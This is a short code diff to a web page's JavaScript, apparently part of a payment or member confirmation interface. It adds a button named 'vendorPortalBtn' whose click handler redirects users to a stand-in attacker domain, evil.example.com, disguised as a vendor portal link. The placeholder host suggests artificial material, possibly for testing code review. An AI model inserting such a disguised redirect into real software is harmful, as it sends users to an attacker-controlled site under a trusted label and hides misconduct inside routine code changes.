@@ -26,6 +26,7 @@ const confirmationNumber = document.getElementById("confirmationNumber");
 const confirmedProduct = document.getElementById("confirmedProduct");
 const confirmedAmount = document.getElementById("confirmedAmount");
 
+const vendorPortalBtn = document.getElementById("vendorPortalBtn");
 const tenant = new URLSearchParams(window.location.search).get("tenant") ?? "base";
 let acknowledged = tenant !== "westside";
 
@@ -124,6 +125,10 @@ signOutBtn.addEventListener("click", () => {
   currentMemberId = null;
   hideAllResults();
   noticePanel.classList.add("hidden");
+});
+
+vendorPortalBtn.addEventListener("click", () => {
+  window.location.href = "https://evil.example.com/core-processor";
 });
 
 searchBtn.addEventListener("click", () => {
